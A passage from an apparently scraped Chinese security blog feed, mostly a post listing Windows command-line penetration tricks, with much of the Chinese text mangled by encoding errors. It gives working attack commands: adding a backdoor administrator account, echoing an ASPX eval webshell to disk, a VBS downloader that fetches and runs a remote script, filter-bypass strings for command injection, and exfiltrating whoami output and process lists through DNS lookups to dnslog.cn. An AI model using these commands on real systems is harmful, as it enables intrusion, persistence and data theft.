src="https://mmbiz.qpic.cn/mmbiz_png/64HEibicwoTVPB8smnhdVoc7JbSaYqwqvrUcgmufsMThIEejT2UyKBJha6pdibPxAIGLoTibtmG5CvC73DzZ0ubv1Q/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/4R3RgYzzCgG6fvduwiaD0Uzhd9MCO2xZfIttlKGLlzCNCTnAXk4QJyeBoRuDmSMgIMrBricSrdV6F5tH6OGGj80g/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p><p> äº”:  å…³äºæ–‡åº“ğŸ¦‰</p><pre><code>https://www.yuque.com/peiqiwik                           </code></pre><p><img src="https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4YJdsaYQxt8Y3SCzgBNk7M1sUD3R1Am0JerQ98aaxL4qVEdVxM9YquIrAs2ovlic0sTp2KXdrvEnQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p><h2 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h2><blockquote><p>ä¸‹é¢å°±æ˜¯æ–‡åº“çš„å…¬ä¼—å·å•¦ï¼Œæ›´æ–°çš„æ–‡ç« éƒ½ä¼šåœ¨ç¬¬ä¸€æ—¶é—´æ¨é€åœ¨äº¤æµç¾¤å’Œå…¬ä¼—å·</p><p>æƒ³è¦åŠ å…¥äº¤æµç¾¤çš„å¸ˆå‚…å…¬ä¼—å·ç‚¹å‡»äº¤æµç¾¤åŠ æˆ‘æ‹‰ä½ å•¦~</p><p>åˆ«å¿˜äº†Githubä¸‹è½½å®Œç»™ä¸ªå°æ˜Ÿæ˜Ÿâ­</p></blockquote><p><img src="http://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4k7oncstuDUYBxrtzOqAW4oGso8T29V66MANjNbTib9AIdfGoxhxNMpEhYWG8x4PxK2Yfwq2j6S0w/0?wx_fmt=png" alt></p><p><strong>PeiQiæ–‡åº“</strong></p><p>ä¹Œæ‹‰ä¹Œæ‹‰ï¼</p><p>89ç¯‡åŸåˆ›å†…å®¹</p><p>å…¬ä¼—å·</p><p><img src="http://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzDjy8pCtpvJKBibCLXQDm14MbdlTqXYESXADHkVpL6f81Z4TVFOGQMjBjgxPpUcYnzahRhibQUdcKzQ/0?wx_fmt=png" alt></p><p><strong>WgpSecç‹¼ç»„å®‰å…¨å›¢é˜Ÿ</strong></p><p>WgpSec ç‹¼ç»„å®‰å…¨å›¢é˜Ÿç”±å‡ ä½çƒ­çˆ±ç½‘ç»œå®‰å…¨çš„å¹´è½»äººä¸€åŒç»„æˆè¿‡å»çš„å‡ å¹´å†…æ²¡æ¥å¾—åŠè®©å›¢é˜Ÿå‘ç”Ÿæœ‰æ•ˆä¸”è´¨çš„å˜åŒ–è¿™ä¸€æ¬¡ï¼Œä¸ºäº†æˆ‘ä»¬çš„sloganï¼šæ‰“é€ ä¿¡æ¯å®‰å…¨ä¹Œæ‰˜é‚¦ã€‚å‰è¿›ï¼</p><p>120ç¯‡åŸåˆ›å†…å®¹</p><p>å…¬ä¼—å·</p><p><strong>åŒæ—¶çŸ¥è¯†æ˜Ÿçƒä¹Ÿå¼€æ”¾è¿è¥å•¦ï¼Œå¸Œæœ›å¸ˆå‚…ä»¬æ”¯æŒæ”¯æŒå•¦ğŸŸ</strong></p><p><strong>çŸ¥è¯†æ˜Ÿçƒé‡Œä¼šæŒç»­å‘å¸ƒä¸€äº›æ¼æ´å…¬å¼€ä¿¡æ¯å’ŒæŠ€æœ¯æ–‡ç« ~</strong></p><p><img src="/s/data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt></p><p><strong>ç”±äºä¼ æ’­ã€åˆ©ç”¨æ­¤æ–‡æ‰€æä¾›çš„ä¿¡æ¯è€Œé€ æˆçš„ä»»ä½•ç›´æ¥æˆ–è€…é—´æ¥çš„åæœåŠæŸå¤±ï¼Œå‡ç”±ä½¿ç”¨è€…æœ¬äººè´Ÿè´£ï¼Œæ–‡ç« ä½œè€…ä¸ä¸ºæ­¤æ‰¿æ‹…ä»»ä½•è´£ä»»ã€‚</strong></p><p><strong>PeiQiæ–‡åº“ æ‹¥æœ‰å¯¹æ­¤æ–‡ç« çš„ä¿®æ”¹å’Œè§£é‡Šæƒå¦‚æ¬²è½¬è½½æˆ–ä¼ æ’­æ­¤æ–‡ç« ï¼Œå¿…é¡»ä¿è¯æ­¤æ–‡ç« çš„å®Œæ•´æ€§ï¼ŒåŒ…æ‹¬ç‰ˆæƒå£°æ˜ç­‰å…¨éƒ¨å†…å®¹ã€‚æœªç»ä½œè€…å…è®¸ï¼Œä¸å¾—ä»»æ„ä¿®æ”¹æˆ–è€…å¢å‡æ­¤æ–‡ç« å†…å®¹ï¼Œä¸å¾—ä»¥ä»»ä½•æ–¹å¼å°†å…¶ç”¨äºå•†ä¸šç›®çš„ã€‚</strong></p><p>var first_sceen__time = (+new Date()); if (â€œâ€ == 1 &amp;&amp; document.getElementById(â€˜js_contentâ€™)) { document.getElementById(â€˜js_contentâ€™).addEventListener(â€œselectstartâ€,function(e){ e.preventDefault(); }); }</p><p>PeiQiæ–‡åº“</p><p>æ”¯æŒæ”¯æŒå•¦</p><p><strong>å¾®ä¿¡æ‰«ä¸€æ‰«èµèµä½œè€…</strong> <a href="#">èµèµ</a></p><p>å·²å–œæ¬¢ï¼Œ<a href="#">å¯¹ä½œè€…è¯´å¥æ‚„æ‚„è¯</a></p><p>å–æ¶ˆ</p><h4 id="å‘é€ç»™ä½œè€…"><a href="#å‘é€ç»™ä½œè€…" class="headerlink" title="å‘é€ç»™ä½œè€…"></a>å‘é€ç»™ä½œè€…</h4><p>å‘é€</p><p>æœ€å¤š40å­—ï¼Œå½“å‰å…±å­—</p><p> <a href="#"></a> äººèµèµ</p><p>ä¸Šä¸€é¡µ <a href="#">1</a>/3 ä¸‹ä¸€é¡µ</p><p>é•¿æŒ‰äºŒç»´ç å‘æˆ‘è½¬è´¦</p><p>æ”¯æŒæ”¯æŒå•¦</p><p>å—è‹¹æœå…¬å¸æ–°è§„å®šå½±å“ï¼Œå¾®ä¿¡ iOS ç‰ˆçš„èµèµåŠŸèƒ½è¢«å…³é—­ï¼Œå¯é€šè¿‡äºŒç»´ç è½¬è´¦æ”¯æŒå…¬ä¼—å·ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/11/26/Windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E5%B8%B8%E7%94%A8%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/Windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E5%B8%B8%E7%94%A8%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/"/>
      <url>/2021/11/26/Windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E5%B8%B8%E7%94%A8%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/Windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E5%B8%B8%E7%94%A8%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<h1 id="Windowså‘½ä»¤è¡Œä¸‹å¸¸ç”¨æ¸—é€æŠ€å·§"><a href="#Windowså‘½ä»¤è¡Œä¸‹å¸¸ç”¨æ¸—é€æŠ€å·§" class="headerlink" title="Windowså‘½ä»¤è¡Œä¸‹å¸¸ç”¨æ¸—é€æŠ€å·§"></a>Windowså‘½ä»¤è¡Œä¸‹å¸¸ç”¨æ¸—é€æŠ€å·§</h1><p>åŸåˆ› 3had0w <a href="javascript:void(0" target="_blank" rel="noopener">æ½‡æ¹˜ä¿¡å®‰</a>;)</p><p><strong>æ½‡æ¹˜ä¿¡å®‰</strong></p><p>å¾®ä¿¡å· xxxasec</p><p><strong>0x01 å‰è¨€</strong></p><p>æ¸—é€æµ‹è¯•ä¸­æ— è®ºæ˜¯æ‰“ç‚¹ï¼Œè¿˜æ˜¯åæ¸—é€ï¼Œå¤šå¤šå°‘å°‘éƒ½ä¼šç”¨åˆ°å‘½ä»¤è¡Œä¸‹çš„ä¸€äº›æŠ€å·§ä»¥è¾¾åˆ°å¿«é€Ÿæ‹¿åˆ°ç›®æ ‡ä¸»æœºæƒé™å’Œç»•è¿‡ä¸€äº›å®‰å…¨é˜²æŠ¤åŠŸèƒ½ç­‰ã€‚å…¶å®åœ¨cmdå’Œpowershellä¸‹åªè¦çµæ´»è¿ç”¨å°±èƒ½æ»¡è¶³å¤§éƒ¨åˆ†æ¸—é€éœ€æ±‚ï¼Œä¸»è¦è¿˜æ˜¯çœ‹ä½ é‡åˆ°ä»€ä¹ˆæ ·çš„åœºæ™¯ï¼Œéœ€è¦å®Œæˆä»€ä¹ˆéœ€æ±‚ï¼Œè¾¾åˆ°ä»€ä¹ˆæ ·çš„æ•ˆæœï¼Ÿ</p><p>å½“ç„¶ï¼Œè¿™é‡Œç¬”è€…ä¹Ÿåªæ˜¯å°†ä»¥å‰è‡ªå·±å¸¸ç”¨åˆ°çš„ï¼Œä»¥åŠåœ¨çœ‹å„ä½å¸ˆå‚…æ–‡ç« ä¸­å­¦åˆ°çš„æŠ€å·§æœé›†æ•´ç†åœ¨ä¸€èµ·åˆ†äº«ç»™å¤§å®¶ï¼Œå¸Œæœ›å¯¹å¤§å®¶èƒ½æœ‰æ‰€å¸®å¿™ï¼Œæœ‰æ—¶é—´å†åšè¡¥å……ï¼Œä¹ŸæœŸå¾…å„ä½å¸ˆå‚…çš„è¡¥å……ï¼ï¼ï¼å¦‚æœ‰é”™è¯¯ï¼Œè¿˜æœ›æŒ‡å‡ºï¼ï¼ï¼<img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDjzjIQgDD4wUBR0WkSx8HQjfYK1mRJfibGBGibXwMmibpyFHukKG79IaDw/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p><p><strong>0x02 åˆ©ç”¨|/&amp;ç®¡é“ç¬¦æ‰§è¡Œå¤šæ¡å‘½ä»¤</strong></p><p><strong>åº”ç”¨åœºæ™¯ï¼š</strong>å¸¸ç”¨äºæŸ¥æ‰¾è¿œç¨‹æ¡Œé¢ç«¯å£å·ã€å¼‚å¸¸ç½‘ç»œè¿æ¥ä»¥åŠæ·»åŠ ç®¡ç†å‘˜ç”¨æˆ·ç­‰ã€‚  </p><pre><code>netstat -ano | findstr &quot;ESTABLISHED&quot;net user 90sec 123456 /ad &amp; net localgroup administrators 90sec /ad</code></pre><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDicicznECspY47EVW5QeNSfc4yRPntwOiazH0VHxF3AxQZECzqHXcQO1EQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p><p><strong><strong>0x03 åˆ©ç”¨^è½¬ä¹‰ç¬¦è§£å†³&lt;&gt;å­—ç¬¦é—®é¢˜</strong></strong></p><p><strong>åº”ç”¨åœºæ™¯ï¼š</strong>å¸¸ç”¨äºå†™å…¥Webshellæœ¨é©¬æ–‡ä»¶æ—¶å¯¹&lt;&gt;ã€&amp;ç­‰ç‰¹æ®Šå­—ç¬¦çš„è½¬ä¹‰ï¼Œä¸åŠ å†™ä¸äº†ã€‚  </p><pre><code>echo ^&lt;%@Page Language=&quot;Jscript&quot; validateRequest=&quot;false&quot;%^&gt;^&lt;%Response.Write(eval(Request.Item[&quot;w&quot;],&quot;unsafe&quot;));%^&gt; &gt; c:\Users\3had0w\Desktop\ok.aspx</code></pre><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDo1SptPLDD7mo4ZGfprOHNTaf9NhNyfdFIh5qsQEqS5qpzZX6qJicBPQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p><p><strong>0x04 åˆ©ç”¨dir/forç­‰å‘½ä»¤æŸ¥æ‰¾ç½‘ç«™è·¯å¾„</strong></p><p><strong>åº”ç”¨åœºæ™¯ï¼š</strong>å¸¸ç”¨äºå†…ç½‘ä¿¡æ¯æœé›†æŸ¥æ‰¾é“­æ„Ÿæ–‡ä»¶å’Œå†…å®¹ï¼Œä¹Ÿå¯æ ¹æ®æ–‡ä»¶åã€æ‰©å±•ä»¥åŠå†…å®¹æ¥æŸ¥æ‰¾æ–‡ä»¶æ‰€åœ¨ä½ç½®ç»å¯¹è·¯å¾„ï¼Œå¦‚ï¼š1.ç½‘ç«™è·¯å¾„å’Œæ•°æ®åº“è¿æ¥æ–‡ä»¶ã€2.è¢«é»‘ç°äº§ä¿®æ”¹è¿‡çš„ï¼ˆè·³è½¬ï¼‰è„šæœ¬æ–‡ä»¶ç­‰ã€‚  </p><pre><code>dir /a/b/s D:\web\*.aspwhere /r D:\web\ *.php *.aspfor /r D:\web\ %i in (*.php *.asp) do @echo %i%windir%\system32\inetsrv\appcmd list VDIRfindstr /n /s /i &quot;uid=sa&quot; E:\ftp_bak\*.configfindstr /n /s /i &quot;DB_PWD&quot; D:\www\*.php</code></pre><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDzqYMnLScoliaVVYMNk2QYpz4CMLdORptricCT97icEibuHDbprpepV82Gg/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDib39RkbOOmdGfHIJpaBY4kSpMicn5kaaPJAPo2Mr6zHWKzSX4Gq6ZL5g/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p><p><strong>0x05 åˆ©ç”¨:å†’å·å°†VBSè„šæœ¬ä»£ç å†™åœ¨ä¸€è¡Œ</strong></p><p><strong>åº”ç”¨åœºæ™¯ï¼š</strong>å¸¸ç”¨äºå‘½ä»¤è¡Œä¸‹å†™å…¥Webshellæœ¨é©¬ã€VBSæ·»åŠ ç”¨æˆ·ã€ä¸‹è½½è€…ç­‰æ¶æ„è„šæœ¬ï¼Œ&gt;åˆ›å»ºï¼Œ&gt;&gt;å åŠ ï¼Œæ³¨æ„2ã€4ã€8ã€9è¡Œä¸­çš„&amp;ç®¡é“ç¬¦ï¼Œä¹Ÿè¦ç”¨^è½¬ä¹‰ä¸‹æ‰èƒ½æ­£å¸¸å†™å…¥ã€‚</p><pre><code>echo set wsnetwork=CreateObject(&quot;WSCRIPT.NETWORK&quot;) &gt; C:\adduser.vbsecho os=&quot;WinNT://&quot;^&amp;wsnetwork.ComputerName &gt;&gt; C:\adduser.vbsecho Set ob=GetObject(os) &gt;&gt; C:\adduser.vbsecho Set oe=GetObject(os^&amp;&quot;/Administrators,group&quot;) &gt;&gt; C:\adduser.vbsecho Set od=ob.Create(&quot;user&quot;,&quot;betasec&quot;) &gt;&gt; C:\adduser.vbsecho od.SetPassword &quot;pass!@#!23&quot; &gt;&gt; C:\adduser.vbsecho od.SetInfo &gt;&gt; C:\adduser.vbsecho Set of=GetObject(os^&amp;&quot;/betasec&quot;,user) &gt;&gt; C:\adduser.vbsecho oe.add os^&amp;&quot;/betasec&quot; &gt;&gt; C:\adduser.vbs</code></pre><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDrOJuttJ63pboRxreOEsDt5oiaJk3zlucNYOjr5JB4H1boC2PxTZOJOw/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p><p><strong>0x06 åˆ©ç”¨&gt;/&gt;&gt;é‡å®šå‘ç¬¦å åŠ å†™å…¥VBS</strong></p><p><strong>åº”ç”¨åœºæ™¯ï¼š</strong>å¸¸ç”¨äºMSSQLé«˜æƒé™æ³¨å…¥ç‚¹å†™å…¥VBSè„šæœ¬æ–‡ä»¶ï¼Œä¸€è¡Œä¸€è¡Œå†™è¿‡äºç¹çã€‚VBScriptå¯ä»¥åœ¨ä¸€è¡Œä»£ç å†…åŒæ—¶å¯¹ä¸¤ä¸ªå˜é‡è¿›è¡Œèµ‹å€¼ï¼Œä¸­é—´ç”¨å†’å·åˆ†éš”å³å¯ï¼Œè„šæœ¬å¯æ­£å¸¸æ‰§è¡Œã€‚</p><pre><code>echo Set Post = CreateObject(&quot;Msxml2.XMLHTTP&quot;):Set Shell = CreateObject(&quot;Wscript.Shell&quot;):Post.Open &quot;GET&quot;,&quot;http://127.0.0.1/adduser.txt&quot;,0 :Post.Send():Set aGet = CreateObject(&quot;ADODB.Stream&quot;):aGet.Mode = 3:aGet.Type = 1:aGet.Open():aGet.Write(Post.responseBody):aGet.SaveToFile &quot;c:\adduser.vbs&quot;,2:wscript.sleep 1000:Shell.Run (&quot;c:\adduser.vbs&quot;) &gt; c:\down.vbs</code></pre><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDuoosibYdBV5SibdYgh20nibsSiavjSIalUgSQiaGQ9HLfAN22sWORhekxIQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p><p><strong>0x07 åˆ©ç”¨forå‘½ä»¤æ¢æµ‹å·¥ä½œç»„/åŸŸå­˜æ´»ä¸»æœº</strong></p><p><strong>åº”ç”¨åœºæ™¯ï¼š</strong>å¸¸ç”¨äºæ¢æµ‹å·¥ä½œç»„å’ŒåŸŸå†…å­˜æ´»ä¸»æœºï¼Œç”¨çš„æ˜¯Pingå‘½ä»¤ï¼ŒåŸºäºICMPåè®®ï¼Œä½†å¦‚æœç¦Pingæ—¶è¯¥æ–¹æ³•åˆ™æ— æ•ˆï¼Œåˆ©ç”¨æ­¤æ–¹æ³•åœ¨å®é™…åº”ç”¨ä¸­å¯èƒ½éœ€è¦åšå°‘è®¸ä¿®æ”¹ï¼šå†…ç½‘IPæˆ–ç½‘æ®µã€‚</p><p><strong>ç›´æ¥åœ¨å‘½ä»¤ç»ˆç«¯å›æ˜¾ï¼š</strong></p><pre><code>@for /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1 | findstr /i &quot;ttl=&quot;</code></pre><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDibe9Vvibia5PH4f0mBVooia3rIibBKh8fYvBibALCcNx7BwLZX7NoSF7BydA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p><p><strong>å°†å­˜æ´»ä¸»æœºå†™å…¥åˆ°æ–‡ä»¶ï¼š</strong></p><pre><code>@for /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1 | findstr /i &quot;ttl=&quot; &gt;nul &amp; if errorlevel 1 (echo 192.168.1.%i May be sleeping ! &gt;&gt; result.txt) else (echo 192.168.1.%i is alive ! &gt;&gt; result.txt)æŸ¥çœ‹æ‰«æåçš„å­˜æ´»ä¸»æœºï¼štype result.txt | findstr &quot;alive&quot;</code></pre><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGD17guzFGg6z4r9SZUA6a1MNyfcatOPyxRqrOuIDlBhTDG6nk8RzMzEw/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p><p><strong>å·¥ä½œç»„/åŸŸå†…å­˜æ´»ä¸»æœºæ¢æµ‹ï¼š</strong></p><p>è¿™ä¸ªæ‰¹å¤„ç†æ–‡ä»¶å¯ç”¨äºå¯¹å†…ç½‘å·¥ä½œç»„å’ŒåŸŸå†…å­˜æ´»ä¸»æœºè¿›è¡Œç®€å•çš„æ‰«ææ¢æµ‹ï¼Œå¹¶ä¸”æ”¯æŒä¸­è‹±æ–‡æ“ä½œç³»ç»Ÿã€‚</p><pre><code>@echo off@echo.@FOR /F &quot;usebackq delims=, &quot; %%J IN (`net view /domain ^|find &quot;å‘½ä»¤æˆåŠŸå®Œæˆ&quot; /v ^|find &quot;The command completed successfully.&quot; /v ^|find &quot;å‘½ä»¤æˆåŠŸå®Œæˆ&quot; /v ^|find &quot;--&quot; /v ^|find &quot;Domain&quot; /v ^|find &quot;&quot; /v ^|find &quot;ã‚³ãƒãƒ³ãƒ‰ã¯æ­£å¸¸ã«çµ‚äº†ã—ã¾ã—ãŸ&quot; /v /i`) do (@echo ====== Domain:%%J =========@FOR /F &quot;usebackq eol=; delims=, &quot; %%i in (`net view /domain:%%J ^|findstr &quot;\\&quot;`) do (@FOR /F &quot;usebackq eol=; tokens=1,2,3* delims=\\&quot; %%a in (`@echo %%i`) do (ping %%a -4 -n 1 -w 100 |find /i &quot;ping&quot; &gt; %%a.txt@FOR /F &quot;tokens=2 delims=[]&quot; %%b in (%%a.txt) do @echo \\%%a = [%%b]@del /f /q %%a.txt)))@echo ====== Getting IP Complete ======</code></pre><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDuz92w6k2Io1ibpWon5W4jTUj4icC8gSNU96Xw9s8U5aZfjzA8XAlM6Bg/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p><p><strong>0x08 åˆ©ç”¨ç¬¦å·æˆ–è€…ç¯å¢ƒå˜é‡æˆªå–ç»•è¿‡ç©ºæ ¼</strong></p><p><strong>åº”ç”¨åœºæ™¯ï¼š</strong>å¸¸ç”¨äºå‘½ä»¤æ‰§è¡Œæ¼æ´ç»•è¿‡ï¼Œåœ¨ä»£ç å±‚é¢æˆ–å®‰å…¨é˜²æŠ¤ä¸­è¿‡æ»¤äº†ç©ºæ ¼ï¼Œä¹Ÿå°±æ˜¯åœ¨æ‰§è¡Œå‘½ä»¤æ—¶ä¸èƒ½å¸¦æœ‰ç©ºæ ¼ï¼Œæœ€è¿‘å‡ å¤©åœ¨å‡ ä¸ªç¾¤é‡Œéƒ½çœ‹åˆ°æœ‰äººè®¨è®ºè¿™ä¸ªé—®é¢˜ï¼Œä¹Ÿå±å¸¸è§é—®é¢˜ã€‚</p><p><strong>ç‰¹æ®Šç¬¦å·ï¼š<a href="http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&amp;mid=2247491624&amp;idx=1&amp;sn=6ba97c2d5485fb668c074db3985bb7f9&amp;chksm=cfa5443bf8d2cd2d4be615b26f9275b5617563013258cf7092021167c9e434320913ab30b7f0&amp;scene=21 textvalue=" target="_blank" rel="noopener">è®°ä¸€æ¬¡â€œä¸Šä¼ â€å‘½ä»¤æ‰§è¡Œçš„ç»•è¿‡æ¡ˆä¾‹</a></strong></p><pre><code>echo.123&gt;&gt;a.txtecho,123&gt;&gt;a.txttype;a.txt[...SNIP...]&amp;cd;..&amp;cd;..&amp;cd;windows&amp;cd;system32&amp;cd;..&amp;cd;1631359215&amp;cs.jpg&amp;.jpg[...SNIP...]</code></pre><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGD9ib59TnTzlWyRQPxSmbQia4PWEZWzlmjvUjglZ4KFc3dJgB64Qz5OLqA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p><p><strong>ç¯å¢ƒå˜é‡ï¼š<a href="http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&amp;mid=2247485655&amp;idx=1&amp;sn=229537b3ce9e7927178eec9882d69168&amp;chksm=cfa6acc4f8d125d22fd063f6e80c7c6751e3c5ecea568b59f45d1a60591b4f4cd208ab6dc6a2&amp;scene=21 textvalue=" target="_blank" rel="noopener">å‘½ä»¤æ³¨å…¥é¶åœºç©ºæ ¼è¿‡æ»¤ç»•è¿‡æµ‹è¯•</a></strong></p><pre><code>%path:~10,1%%programfiles:~10,1%%processor_identifier:~7,1%%commonprogramw6432:~10,1%%commonprogramfiles(x86):~10,1%%commonprogramfiles:~10,1%%commonprogramfiles:~10,-18%%commonprogramfiles:~23,1%%fps_browser_app_profile_string:~8,1%[...SNIP...]</code></pre><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDRAjK2jJzr32sc6mw2aUAaukyBQZ6YguHTaUs98xicRCAl1mYLdNtXPQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p><p><strong>0x09 åˆ©ç”¨dnslogæŸ¥çœ‹æ³¨å…¥ç‚¹æ‰§è¡Œå‘½ä»¤ç»“æœ</strong></p><p><strong>åº”ç”¨åœºæ™¯ï¼š</strong>å¸¸ç”¨äºæ¢æµ‹ç›®æ ‡ä¸»æœºçš„DNSåè®®æ˜¯å¦èƒ½å¤Ÿå‡ºç½‘ï¼Œæˆ–è€…æ˜¯åœ¨é«˜æƒé™æ³¨å…¥æ— å›æ˜¾æ—¶ä¹Ÿå¯ä»¥é€šè¿‡dnslogæ¥å°†å‘½ä»¤æ‰§è¡Œç»“æœå¸¦å‡ºï¼Œå¦‚ï¼šæŸ¥çœ‹å½“å‰ç”¨æˆ·å’Œè¿›ç¨‹åˆ—è¡¨ç­‰ã€‚</p><p><strong>æ¢æµ‹DNSå‡ºç½‘çŠ¶æ€ï¼š</strong></p><pre><code>ping ******.dnslog.cnnslookup ******.dnslog.cn&lt;?php gethostbyname(&quot;******.dnslog.cn&quot;);?&gt;</code></pre><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDVL12iaNUgUOUOOrfvU04MLqOSyRViayETdpfGKRCCZ3bYDY4HEhanib5Q/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p><p><strong>æŸ¥è¯¢å½“å‰ç”¨æˆ·æƒé™ï¼š</strong></p><pre><code>for /F %i in (&apos;whoami&apos;) do nslookup %i.lr5dyr.dnslog.cncmd /v /c &quot;whoami &gt; temp &amp;&amp; certutil -encode temp temp2 &amp;&amp; findstr /L /V &quot;CERTIFICATE&quot; temp2 &gt; temp3 &amp;&amp; set /p MYVAR=&lt; temp3 &amp;&amp; set FINAL=!MYVAR!.ly9hvm.dnslog.cn &amp;&amp; nslookup !FINAL!&quot; &amp;&amp; del temp*</code></pre><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGD5Nkm5yAdVOGxsbTY6FCnXdmr51AtNS9ru4tVPzEjnYNiaTPdyVeFFpQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p><p><strong>0x10 åˆ©ç”¨dnslogæŸ¥çœ‹ç›®æ ‡ä¸»æœºçš„æ€æ¯’è½¯ä»¶</strong></p><p><strong>åº”ç”¨åœºæ™¯ï¼š</strong>ç”¨äºMSSQLé«˜æƒé™æ³¨å…¥ï¼Œç›®æ ‡ä¸»æœºä¸å‡ºç½‘ï¼Œä½†æƒ³åˆ©ç”¨dnslogæ¢æµ‹ä¸»æœºä¸­æ˜¯å¦æœ‰æ€è½¯ï¼Ÿä¸¤ç§æ–¹æ³•åŸç†ä¸€æ ·ï¼Œéƒ½æ˜¯å…ˆè·å–è¿›ç¨‹åˆ—è¡¨ï¼Œç„¶åforã€ForEachå¾ªç¯Pingã€nslookupé€šè¿‡dnslogå¸¦å‡ºæ¥ã€‚</p><pre><code>for /F %i in (&apos;wmic process get Name ^| findstr &quot;.exe&quot;&apos;) do ping -n 1 %i.******.dnslog.cn &gt;nulpowershell -c &quot;Get-Process | select processname &gt; 1.txt&quot;powershell -c &quot;Get-Content .\1.txt | Sort-Object -Unique | ForEach-Object {if($_ -match $regex){$b=$_.trim();ping -n 1 $b&apos;.***fks2j.ns.dns3.cf.&apos;} }&quot;</code></pre><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDX1vq27Fic9Wm6LKLrEQC4jicHRxDgHbK1dboUPGCqic9eZKgGavDKCIRw/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p><hr><p>å…³æ³¨å…¬ä¼—å·å›å¤â€œ9527â€å¯å…è´¹è·å–ä¸€å¥—HTBé¶åœºæ–‡æ¡£å’Œè§†é¢‘ï¼Œâ€œ1120â€å®‰å…¨å‚è€ƒæ‚å¿—ç”µå­ç‰ˆï¼Œâ€œ1208â€ä¸ªäººå¸¸ç”¨é«˜æ•ˆçˆ†ç ´å­—å…¸ï¼Œâ€œ0221â€2020å¹´é…’ä»™æ¡¥æ–‡ç« æ‰“åŒ…ï¼Œâ€œ2191â€9æœˆ1æ—¥å‰æ½‡æ¹˜ä¿¡å®‰æ‰€æœ‰æ–‡ç« æ‰“åŒ…ã€‚</p><p> <img 